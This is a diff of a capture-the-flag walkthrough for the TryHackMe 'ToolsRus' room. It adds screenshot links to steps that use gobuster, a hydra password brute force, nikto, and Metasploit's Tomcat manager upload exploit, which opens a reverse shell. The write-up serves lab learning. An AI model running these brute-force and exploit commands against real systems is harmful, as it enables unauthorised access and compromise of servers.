@@ -18,6 +18,7 @@
 ------------------------
 ### Dirbuster
 - sudo gobuster dir -u http://[IP]:[Port] -w [path]/wordlists/dirbuster/directory-list-2.3-medium.txt
+- Picture: [ToolsRus_walkthrough_2.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_2.png)
 - What directory can you find, that begins with a "g"?
 **Answers**: /guidelines
 - Whose name can you find from this directory?
@@ -27,13 +28,16 @@
 ------------------------
 ### hydra
 - sudo hydra -l bob -P  [path]wordlists/rockyou.txt -f 10.10.248.249 http-get /protected/
+- Picture: [ToolsRus_walkthrough_3.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_3.png)
 - What is bob's password to the protected part of the website?
 **Answers**: bubbles
 - Going to the service running on that port, what is the name and version of the software?
+- Picture: [ToolsRus_walkthrough_4.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_4.png)
 **Answer**: Apache Tomcat/7.0.88
 ------------------------
 ### nikto
 - Log to manager with bob credentials
+- Picture: [ToolsRus_walkthrough_5.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_5.png)
 - sudo nikto -h http://10.10.23.90:1234/manager/html/ -id "bob:bubbles"
 - How many documentation files did Nikto identify?
 **Answer**: 5
@@ -41,17 +45,22 @@
 ### Metasploit
 - Search exploit for tomcat
     - search type:exploit name:tomcat
+    - Picture: [ToolsRus_walkthrough_6.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_6.png)
 - Select exploit/multi/http/tomcat_mgr_upload
     - use exploit/multi/http/tomcat_mgr_upload
+    - Picture: [ToolsRus_walkthrough_7.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_7.png)
 - Check settings we need to define
     - show options
+    - Picture: [ToolsRus_walkthrough_8.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_8.png)
 - As we can see we have : HttpPasswrod / HttpUsername / RHOSTS / RPORT / LHOSTS
     - set HttpPassword bubbles
     - set HttpUsername bob
     - set RHOSTS [IP]
     - set RPORT 1234
     - set LHOSTS [local IP machine]
+        - - Picture: [ToolsRus_walkthrough_9.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_9.png) , [ToolsRus_walkthrough_10.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_10.png)
         - Let's double check if we indicate all information
+        - [ToolsRus_walkthrough_11.png](https://github.com/LNB283/THM/blob/main/EASY/ToolsRus/Pictures/ToolsRus_walkthrough_11.png)
 - Execute the payload
     - execution
 - When the payload is active, type these commands
